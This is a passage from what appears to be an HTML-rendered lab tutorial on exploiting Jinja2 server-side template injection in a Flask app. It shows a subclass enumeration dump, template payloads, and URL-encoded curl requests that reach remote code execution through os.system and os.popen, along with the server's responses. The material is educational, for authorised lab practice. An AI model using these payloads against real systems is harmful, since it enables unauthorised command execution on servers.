&amp;#39;tempfile.TemporaryDirectory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.OpenerDirector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.BaseHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.HTTPPasswordMgr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractBasicAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractDigestAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.URLopener&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.ftpwrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Cookie&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookiePolicy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Absent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookieJar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableListMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures._omd_bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Headers&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableHeadersMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.IfRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ContentRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.FileStorage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._MISSING_TYPE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._FIELD_BASE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.InitVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.Field&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._DataclassParams&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Finder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Loader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.ResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hmac.HMAC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.ClosingIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.FileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi._RangeWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.utils.HTMLBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.accept.AcceptMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.AuthorizationMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Encoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.decoder.JSONDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.encoder.JSONEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.FormDataParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.MultiPartParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.user_agent.UserAgent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.useragents._UserAgentParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.request.StreamOnlyMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.response.Response&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStreamMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagRequestMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagResponseMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.user_agent.UserAgentMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieHeaders&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieResponse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.EnvironBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.Client&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Decimal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.SignalDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.ContextManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;numbers.Number&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;uuid.UUID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pdata&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.PicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.UnpicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Framer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unframer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.Bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.BytecodeCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.MissingType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.LRUCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Cycler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Joiner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.EvalContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.Node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.visitor.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.idtracking.Symbols&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.MacroRef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.Frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.TemplateReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.BlockReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.LoopContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Macro&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Undefined&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ast.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Failure&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStreamIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Lexer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Environment&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateModule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateExpression&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.loaders.BaseLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.Local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local._ProxyLookup&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.SequenceMatcher&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.Differ&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.HtmlDiff&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint._safe_key&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint.PrettyPrinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleFactory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleTemplate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.BaseConverter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.Map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.MapAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;gettext.NullTranslations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._FixupStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._AtomicFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.LazyFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.KeepOpenFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.PacifyFlushWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.types.ParamType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Option&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Argument&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.ParsingState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.OptionParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.formatting.HelpFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.BaseCommand&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals._FakeSignal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.DispatchingApp&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.ScriptInfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.config.ConfigAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx._AppCtxGlobals&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.AppContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.RequestContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.scaffold.Scaffold&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous._json._CompactJSON&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.SigningAlgorithm&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.Signer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.serializer.Serializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.JSONTag&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.TaggedJSONSerializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.sessions.SessionInterface&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.blueprints.BlueprintSetupState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unicodedata.UCD&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;__future__._Feature&amp;#39;&amp;gt;]</span></span></span><span class="token output">&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>Let us print out the number and the method names using the following payload.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span> 
+<span class="token punctuation">{</span><span class="token punctuation">{</span> i <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__ <span class="token punctuation">}</span><span class="token punctuation">}</span> 
+<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt; 0 type  1 weakref  2 weakcallableproxy  3 weakproxy  4 int  5 bytearray  6 bytes  7 list  8 NoneType  9 NotImplementedType  10 traceback  11 super  12 range  13 dict  14 dict_keys  15 dict_values  16 dict_items  17 dict_reversekeyiterator  18 dict_reversevalueiterator  19 dict_reverseitemiterator  20 odict_iterator  21 set  22 str  23 slice  24 staticmethod  25 complex  26 float  27 frozenset  28 property  29 managedbuffer  30 memoryview  31 tuple  32 enumerate  33 reversed  34 stderrprinter  35 code  36 frame  37 builtin_function_or_method  38 method  39 function  40 mappingproxy  41 generator  42 getset_descriptor  43 wrapper_descriptor  44 method-wrapper  45 ellipsis  46 member_descriptor  47 SimpleNamespace  48 PyCapsule  49 longrange_iterator  50 cell  51 instancemethod  52 classmethod_descriptor  53 method_descriptor  54 callable_iterator  55 iterator  56 PickleBuffer  57 coroutine  58 coroutine_wrapper  59 InterpreterID  60 EncodingMap  61 fieldnameiterator  62 formatteriterator  63 BaseException  64 hamt  65 hamt_array_node  66 hamt_bitmap_node  67 hamt_collision_node  68 keys  69 values  70 items  71 Context  72 ContextVar  73 Token  74 MISSING  75 moduledef  76 module  77 filter  78 map  79 zip  80 _ModuleLock  81 _DummyModuleLock  82 _ModuleLockManager  83 ModuleSpec  84 BuiltinImporter  85 classmethod  86 FrozenImporter  87 _ImportLockContext  88 _localdummy  89 _local  90 lock  91 RLock  92 _IOBase  93 _BytesIOBuffer  94 IncrementalNewlineDecoder  95 ScandirIterator  96 DirEntry  97 WindowsRegistryFinder  98 _LoaderBasics  99 FileLoader  100 _NamespacePath  101 _NamespaceLoader  102 PathFinder  103 FileFinder  104 zipimporter  105 _ZipImportResourceReader  106 Codec  107 IncrementalEncoder  108 IncrementalDecoder  109 StreamReaderWriter  110 StreamRecoder  111 _abc_data  112 ABC  113 dict_itemiterator  114 Hashable  115 Awaitable  116 AsyncIterable  117 async_generator  118 Iterable  119 bytes_iterator  120 bytearray_iterator  121 dict_keyiterator  122 dict_valueiterator  123 list_iterator  124 list_reverseiterator  125 range_iterator  126 set_iterator  127 str_iterator  128 tuple_iterator  129 Sized  130 Container  131 Callable  132 _wrap_close  133 Quitter  134 _Printer  135 _Helper  136 itemgetter  137 attrgetter  138 methodcaller  139 accumulate  140 combinations  141 combinations_with_replacement  142 cycle  143 dropwhile  144 takewhile  145 islice  146 starmap  147 chain  148 compress  149 filterfalse  150 count  151 zip_longest  152 permutations  153 product  154 repeat  155 groupby  156 _grouper  157 _tee  158 _tee_dataobject  159 Repr  160 deque  161 _deque_iterator  162 _deque_reverse_iterator  163 _tuplegetter  164 _Link  165 partial  166 _lru_cache_wrapper  167 partialmethod  168 singledispatchmethod  169 cached_property  170 DynamicClassAttribute  171 _GeneratorWrapper  172 auto  173 Enum  174 Pattern  175 Match  176 SRE_Scanner  177 State  178 SubPattern  179 Tokenizer  180 Scanner  181 Template  182 Formatter  183 ContextDecorator  184 _GeneratorContextManagerBase  185 _BaseExitStack  186 _Final  187 _Immutable  188 Generic  189 _TypingEmpty  190 _TypingEllipsis  191 NamedTuple  192 typing.io  193 typing.re  194 AST  195 _MarkupEscapeHelper  196 poll  197 epoll  198 BaseSelector  199 socket  200 _IterationGuard  201 WeakSet  202 _RLock  203 Condition  204 Semaphore  205 Event  206 Barrier  207 Thread  208 BaseServer  209 ForkingMixIn  210 _NoThreads  211 ThreadingMixIn  212 BaseRequestHandler  213 WarningMessage  214 catch_warnings  215 date  216 timedelta  217 time  218 tzinfo  219 _Info  220 finalize  221 sha384  222 sha512  223 Random  224 _ResultMixinStr  225 _ResultMixinBytes  226 _NetlocResultMixinBase  227 _localized_month  228 _localized_day  229 Calendar  230 different_locale  231 AddrlistClass  232 Struct  233 unpack_iterator  234 Charset  235 Header  236 _ValueFormatter  237 _PolicyBase  238 BufferedSubFile  239 FeedParser  240 Parser  241 BytesParser  242 Message  243 HTTPConnection  244 _SSLContext  245 _SSLSocket  246 MemoryBIO  247 Session  248 SSLObject  249 MimeTypes  250 Compress  251 Decompress  252 BZ2Compressor  253 BZ2Decompressor  254 LZMACompressor  255 LZMADecompressor  256 Bytecode  257 Untokenizer  258 BlockFinder  259 _void  260 _empty  261 Parameter  262 BoundArguments  263 Signature  264 FrameSummary  265 TracebackException  266 LogRecord  267 PercentStyle  268 Formatter  269 BufferingFormatter  270 Filter  271 Filterer  272 PlaceHolder  273 Manager  274 LoggerAdapter  275 _Missing  276 Aborter  277 Href  278 CompletedProcess  279 Popen  280 HASH  281 blake2b  282 blake2s  283 sha3_224  284 sha3_256  285 sha3_384  286 sha3_512  287 shake_128  288 shake_256  289 _RandomNameSequence  290 _TemporaryFileCloser  291 _TemporaryFileWrapper  292 SpooledTemporaryFile  293 TemporaryDirectory  294 Request  295 OpenerDirector  296 BaseHandler  297 HTTPPasswordMgr  298 AbstractBasicAuthHandler  299 AbstractDigestAuthHandler  300 URLopener  301 ftpwrapper  302 Cookie  303 CookiePolicy  304 Absent  305 CookieJar  306 ImmutableListMixin  307 ImmutableDictMixin  308 _omd_bucket  309 Headers  310 ImmutableHeadersMixin  311 IfRange  312 Range  313 ContentRange  314 FileStorage  315 _HAS_DEFAULT_FACTORY_CLASS  316 _MISSING_TYPE  317 _FIELD_BASE  318 InitVar  319 Field  320 _DataclassParams  321 Event  322 MultipartDecoder  323 MultipartEncoder  324 Finder  325 Loader  326 ResourceReader  327 ImpImporter  328 ImpLoader  329 HMAC  330 ClosingIterator  331 FileWrapper  332 _RangeWrapper  333 HTMLBuilder  334 AcceptMixin  335 AuthorizationMixin  336 WWWAuthenticateMixin  337 Scanner  338 Encoder  339 JSONDecoder  340 JSONEncoder  341 FormDataParser  342 MultiPartParser  343 UserAgent  344 _UserAgentParser  345 Request  346 StreamOnlyMixin  347 Response  348 ResponseStream  349 ResponseStreamMixin  350 CommonRequestDescriptorsMixin  351 CommonResponseDescriptorsMixin  352 ETagRequestMixin  353 ETagResponseMixin  354 UserAgentMixin  355 _TestCookieHeaders  356 _TestCookieResponse  357 EnvironBuilder  358 Client  359 Decimal  360 Context  361 SignalDictMixin  362 ContextManager  363 Number  364 UUID  365 Unpickler  366 Pickler  367 Pdata  368 PicklerMemoProxy  369 UnpicklerMemoProxy  370 _Framer  371 _Unframer  372 _Pickler  373 _Unpickler  374 Bucket  375 BytecodeCache  376 MissingType  377 LRUCache  378 Cycler  379 Joiner  380 Namespace  381 EvalContext  382 Node  383 NodeVisitor  384 Symbols  385 MacroRef  386 Frame  387 TemplateReference  388 Context  389 BlockReference  390 LoopContext  391 Macro  392 Undefined  393 NodeVisitor  394 Failure  395 TokenStreamIterator  396 TokenStream  397 Lexer  398 Parser  399 Environment  400 Template  401 TemplateModule  402 TemplateExpression  403 TemplateStream  404 BaseLoader  405 Local  406 LocalStack  407 LocalManager  408 _ProxyLookup  409 LocalProxy  410 SequenceMatcher  411 Differ  412 HtmlDiff  413 _safe_key  414 PrettyPrinter  415 RuleFactory  416 RuleTemplate  417 BaseConverter  418 Map  419 MapAdapter  420 NullTranslations  421 _FixupStream  422 _AtomicFile  423 LazyFile  424 KeepOpenFile  425 PacifyFlushWrapper  426 ParamType  427 Option  428 Argument  429 ParsingState  430 OptionParser  431 HelpFormatter  432 Context  433 BaseCommand  434 Parameter  435 Namespace  436 _FakeSignal  437 DispatchingApp  438 ScriptInfo  439 ConfigAttribute  440 _AppCtxGlobals  441 AppContext  442 RequestContext  443 Scaffold  444 _CompactJSON  445 SigningAlgorithm  446 Signer  447 Serializer  448 JSONTag  449 TaggedJSONSerializer &lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>As you can see in the application's response, <code>catch_warnings</code> is located at index #214.</p>
+<p>We have everything we need to construct an RCE payload, such as the following.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">214</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"touch /tmp/test1"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt;0&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>The application returns <code>0</code> in its response. This is the return of the value of the command we just executed. <code>0</code> indicates that the command was executed without errors.</p>
+<p>We can identify if <code>test1</code> was created using the following payload.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">214</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /tmp'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre></div></div>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Curl - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"</span></span></span>
+
+<span class="token output">&lt;SNIP&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt;test1
+tmpv4tucw2b
+&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+&lt;SNIP&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>Now that we have gone through the payload development process, it's worth mentioning that we can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are <code>request</code> and <code>lipsum</code>. Feel free to submit them to this section's target.</p>
